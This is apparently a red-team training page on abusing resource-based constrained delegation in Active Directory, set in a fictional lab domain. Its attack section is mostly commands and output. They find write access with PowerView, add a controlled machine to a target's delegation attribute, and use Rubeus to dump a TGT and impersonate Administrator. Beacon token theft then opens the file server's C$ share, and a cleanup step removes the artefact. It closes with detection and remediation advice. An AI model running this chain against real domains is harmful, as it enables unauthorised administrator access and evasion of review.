---
title: "Exploiting Resource-Based Constrained Delegation (RBCD)"
date: 2026-09-25
weight: 4
type: docs
tags:
  - Kerberos
  - Resource-Based Constrained Delegation
  - Active Directory
---

## From constrained to resource-based delegation

Classic constrained delegation is configured on the front-end service and lists the back-end service(s) it is permitted to reach. Editing the `msDS-AllowedToDelegateTo` attribute that holds that list is not something an ordinary administrator can do: it requires the [SeEnableDelegationPrivilege](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation) user right on the domain controllers, which in practice is held only by enterprise and domain administrators. Microsoft regarded that as a design flaw, because the people who actually owned the back-end resources had no clean way of seeing which front-end services were being allowed to delegate to them.

Windows Server 2012 answered that with a new model, resource-based constrained delegation, usually abbreviated to RBCD. RBCD hands the decision to the owner of the resource being accessed and no longer depends on `SeEnableDelegationPrivilege`. The relationship is inverted: rather than a front-end service declaring which back ends it may reach, each back-end service declares which front ends are allowed to reach it.

That declaration lives in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the account that runs the back-end service. The only permission needed to set it is write access to that attribute, which is commonly delegated to an appropriate group through the Delegation of Control Wizard.

An administrator holding those delegated rights configures RBCD with the RSAT PowerShell cmdlets:

```powershell
$front = Get-ADComputer -Identity 'lon-ws-1'
$back = Get-ADComputer -Identity 'lon-fs-1'

Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front
```

## What makes RBCD abusable

Abusing RBCD works differently from the other delegation types. Compromising the front-end service does not, by itself, lead to compromise of the back end. Instead, an attacker can weaponise RBCD to take over effectively any computer, provided two conditions are both satisfied:

- They hold write access to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target computer object.
- They control another principal that has an SPN set.

As a practical aside, enumerating and abusing RBCD is far smoother over a SOCKS proxy. The examples that follow instead authenticate with explicit plaintext credentials to keep each step visible.

## Finding write access to the attribute

To locate accounts that have been granted write access to this particular attribute, you first need the attribute's schema GUID. Active Directory attributes are [fully documented](https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all), and looking up *ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity* gives its GUID as `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`.

The PowerView query below pulls every computer in the domain, reads through each ACE in their DACLs, and returns only the entries where the object ACE type matches that GUID and the right includes `WriteProperty`:

```powershell
PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
PS C:\Users\Attacker> $Cred = Get-Credential ARCADIA\kfoster
PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier

ObjectDN                                           SecurityIdentifier
--------                                           ------------------
CN=LON-WS-1,OU=Member Servers,DC=arcadia,DC=local  S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-FS-1,OU=Member Servers,DC=arcadia,DC=local  S-1-5-21-3926355307-1661546229-813047887-1107
```

The result tells us that some principal with the SID `S-1-5-21-3926355307-1661546229-813047887-1107` holds the right we care about on both *lon-ws-1* and *lon-fs-1*. Resolving that SID against the directory identifies exactly who it is:

```powershell
PS C:\Users\Attacker> Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 10.10.120.1 -Credential $Cred

DistinguishedName : CN=Server Admins,CN=Users,DC=arcadia,DC=local
GroupCategory     : Security
GroupScope        : Global
Name              : Server Admins
ObjectClass       : group
ObjectGUID        : 5ceea890-d8b7-47f3-918f-f6d3d040d70a
SamAccountName    : Server Admins
SID               : S-1-5-21-3926355307-1661546229-813047887-1107
```

So any member of *Server Admins* can modify the attribute on those two computers.

Worth keeping in mind: this example is the tidy case, where the right has been scoped precisely to the one property. In real environments you will also encounter far looser grants, such as `GenericWrite` or `GenericAll` over the whole object, which achieve the same end by broader means. Account for those variants when you go hunting for DACL abuse primitives.

## Getting a principal with an SPN

The second prerequisite is control of an account that has an SPN. This is because delegation of any kind, unconstrained, constrained, or resource-based, can only be configured on accounts that carry an SPN, which is unsurprising given how central the SPN is to Kerberos. There are a few ways to satisfy this:

- **Another computer account**, if you have elevated to SYSTEM anywhere. Every machine account ships with a default set of SPNs such as HOST, RestrictedKrbHost, TERMSRV, and WSMAN.
- **A service account**, if you have recovered its credentials, for example through kerberoasting.
- **A machine account you create yourself**, as a last resort. The `msDS-MachineAccountQuota` attribute governs how many computer accounts a user may add to the domain, and it applies even to standard domain users. The default is 10. Tooling such as [StandIn](https://github.com/FuzzySecurity/StandIn) can create these accounts over LDAP.

## The attack

Start by reading back the current RBCD configuration across the domain, so you can see what is already in place before touching anything:

```powershell
PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name        PrincipalsAllowedToDelegateToAccount
----        ------------------------------------
LON-DC-1    {}
LON-WS-1    {}
LON-FS-1    {CN=LON-WS-1,OU=Member Servers,DC=arcadia,DC=local}
LON-WKSTN-1 {}
LON-WKSTN-2 {}
```

One quirk to be aware of: an Active Directory property collection can only hold values of a single type. Because *lon-fs-1* already lists *lon-ws-1*, a computer account, you cannot mix in a user account such as *svc_sql01*. Since removing the existing *lon-ws-1* entry is undesirable (although it is possible), this effectively steers you toward using a computer account of your own.

To add a machine you already have SYSTEM on, in this case *lon-wkstn-1*, append it alongside the existing principal rather than replacing it:

```powershell
PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
```

Reading the property back confirms the new entry is present and the original was left intact:

```powershell
PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=arcadia,DC=local, CN=LON-WKSTN-1,OU=Workstations,DC=arcadia,DC=local}
```

With the workstation now trusted to delegate to *lon-fs-1*, the path to access is to obtain a TGT for that principal and then run the S4U sequence through Rubeus. Here we dump the machine's own TGT from the SYSTEM logon session, then feed it straight into `s4u`:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e7
[*] Current LUID    : 0x152a73

  UserName                 : LON-WKSTN-1$
  Domain                   : ARCADIA
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 21/02/2025 06:15:36
  LogonServer              : 
  LogonServerDNSDomain     : arcadia.local
  UserPrincipalName        : LON-WKSTN-1$@arcadia.local


    ServiceName              :  krbtgt/ARCADIA.LOCAL
    ServiceRealm             :  ARCADIA.LOCAL
    UserName                 :  LON-WKSTN-1$ (NT_PRINCIPAL)
    UserRealm                :  ARCADIA.LOCAL
    StartTime                :  21/02/2025 14:17:54
    EndTime                  :  22/02/2025 00:16:11
    RenewTill                :  28/02/2025 14:16:11
    Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  Gv0JODuazH1s79IqvftcBcxr8zo131LNay3BM0xnPcw=
    Base64EncodedTicket   :

      doIFr[...snip...]kNPTQ==
      
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap

[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@ARCADIA.LOCAL'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@ARCADIA.LOCAL'
[*] base64(ticket.kirbi):

      doIF+[...snip...]4tMSQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGh[...snip...]nMtMQ==

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ARCADIA.LOCAL /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==

[*] Using ARCADIA.LOCAL\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : ARCADIA.LOCAL
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4568
[+] Ticket successfully imported!
[+] LUID            : 0x1355200

beacon> steal_token 4568
beacon> ls \\lon-fs-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 09:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:21:18   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     01/24/2025 13:34:02   Windows
 12kb     fil     02/21/2025 06:15:31   DumpStack.log.tmp
 1gb      fil     02/21/2025 06:15:31   pagefile.sys
```

### Cleaning up

RBCD abuse leaves a visible artefact behind: the principal you appended to `msDS-AllowedToActOnBehalfOfOtherIdentity`. Once you have what you came for, restore the attribute to its original state by running `Set-ADComputer` again with only the legitimate account, which removes your entry without disturbing the existing one:

```powershell
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=arcadia,DC=local}
```

## Detection and remediation

RBCD is powerful precisely because the write permission that enables it is easy to grant too broadly and easy to overlook. Audit which principals hold write access to `msDS-AllowedToActOnBehalfOfOtherIdentity`, and treat broad grants such as `GenericWrite` or `GenericAll` over computer objects as the higher-priority risk, since they permit the same abuse and more. Review the value of `msDS-MachineAccountQuota`; setting it to 0 removes the fallback of standard users minting their own SPN-bearing machine accounts. Monitor directory changes to the delegation attribute itself, since a legitimate configuration rarely changes and a sudden new principal appearing there is a strong signal. Finally, place highly privileged accounts in the Protected Users group or mark them as sensitive and not able to be delegated, so that even a successful RBCD setup cannot be used to impersonate them.

## Further reading

- [Microsoft Learn: Resource-based Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Win32: Active Directory schema attributes](https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all)
- [StandIn](https://github.com/FuzzySecurity/StandIn)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)